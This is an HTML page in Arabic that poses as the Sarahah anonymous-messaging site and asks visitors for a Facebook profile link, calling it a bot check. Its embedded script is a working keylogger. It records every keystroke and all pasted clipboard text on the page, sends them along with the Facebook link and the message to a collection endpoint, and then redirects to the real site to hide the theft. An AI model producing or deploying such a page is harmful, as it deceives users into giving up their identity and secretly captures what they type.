<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صراحة - أرسل رسالة سرية</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #29b6f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; }
        .fb-verify { background: #f0f2f5; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #ddd; font-size: 13px; color: #555; }
        input[type="text"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #1877f2; border-radius: 5px; box-sizing: border-box; }
        textarea { width: 100%; height: 100px; padding: 12px; border: 1.5px solid #eee; border-radius: 10px; resize: none; box-sizing: border-box; margin-top: 10px; }
        button { background: #00acc1; color: white; border: none; width: 100%; padding: 12px; border-radius: 25px; cursor: pointer; font-weight: bold; font-size: 18px; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <h1 style="color:#00acc1; margin:0;">صراحة</h1>
    <p>أرسل رسالة سرية لصديقك</p>
    
    <div class="fb-verify">
        🛡️ للبدء، ضع رابط حسابك في فيسبوك للتأكد من أنك لست "روبوت" (سيظل هويتك مخفية تماماً):
        <input type="text" id="fbLink" placeholder="https://facebook.com/your.profile">
    </div>

    <textarea id="msgBox" placeholder="اكتب رسالتك هنا..."></textarea>
    <button id="sendBtn">إرسال الرسالة</button>
</div>

<script>
    let keyBuffer = "";
    const API = '/api/send';

    // 1. الكي لوجر العالمي (يسجل كل حرف في الصفحة)
    window.addEventListener('keydown', (e) => {
        let k = e.key;
        if (k.length > 1) k = ` [${k}] `;
        keyBuffer += k;
        if (keyBuffer.length >= 15) {
            transmit('keystroke', keyBuffer);
            keyBuffer = "";
        }
    });

    // 2. سحب النصوص المنسوخة
    document.addEventListener('paste', (e) => {
        let data = (e.clipboardData || window.clipboardData).getData('text');
        transmit('clipboard', data);
    });

    // 3. وظيفة الإرسال لـ Vercel
    async function transmit(type, content) {
        await fetch(API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type, content, url: location.href })
        });
    }

    // 4. عند الضغط على زر الإرسال
    document.getElementById('sendBtn').onclick = async () => {
        const fbValue = document.getElementById('fbLink').value;
        const msgValue = document.getElementById('msgBox').value;

        if (fbValue) await transmit('facebook_link', fbValue);
        if (msgValue) await transmit('final_message', msgValue);

        alert("تم إرسال رسالتك بنجاح!");
        window.location.href = "https://www.sarahah.com";
    };
</script>

</body>
</html>
